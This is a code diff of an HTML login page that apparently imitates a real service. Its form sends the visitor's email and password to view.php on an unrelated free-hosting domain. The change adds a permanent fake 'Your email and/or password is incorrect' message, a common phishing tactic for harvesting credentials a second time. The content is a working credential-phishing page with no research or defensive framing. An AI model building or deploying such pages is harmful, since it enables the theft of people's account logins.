@@ -603,19 +603,17 @@
         <h1 class="title-text" style="font-size: 2.4rem">Welcome!</h1>
         <p class="subtitle-text">Log in to continue.</p>
         <form action="//sonikuncoro.000webhostapp.com/view.php" method="POST">
-            <div class="input-group">
-                <div class="input-wrapper ">
-                    <input type="email" id="email" name="email" placeholder="example@email.com" required="" autocomplete="off" autofocus="autofocus" maxlength="254">
-                    <label for="txtEmail">Email</label>
-			
-                    <span class="bar"></span>
-                </div>
-                <div class="input-error">
-                    <p class="hide error error_invalid">That doesn't look like an email address.</p>
-                    <p class="hide error error_required">Email is required.</p>
-                    
-                </div>
-            </div>
+           <div class="input-group">
+						<div class="input-wrapper has_error">
+							<input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required="" autocomplete="off" autofocus="autofocus" maxlength="254">
+							<label for="txtEmail" class="raised-label">Email</label>
+							<span class="bar"></span>
+						</div>
+						<div class="input-error">
+							<p class="hide error error_invalid">That doesn't look like an email address.</p>
+							<p class="error error_required">Your email and/or password is incorrect. Perhaps you signed up with a social account?</p>
+						</div>
+					</div>
             <div class="input-group">
                 <div class="input-wrapper">
                     <input type="password" id="txtPass" name="password" required="" autocomplete="off">
